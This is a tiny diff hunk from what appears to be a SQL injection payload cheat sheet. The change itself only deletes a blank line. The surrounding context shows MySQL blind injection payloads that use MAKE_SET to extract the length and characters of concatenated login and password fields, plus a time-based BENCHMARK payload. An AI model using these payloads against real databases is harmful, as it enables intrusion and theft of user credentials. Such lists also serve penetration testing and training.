@@ -40,7 +40,6 @@ AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
 AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
 ```
 
-
 ##MYSQL Time Based
 ```
 +BENCHMARK(40000000,SHA1(1337))+
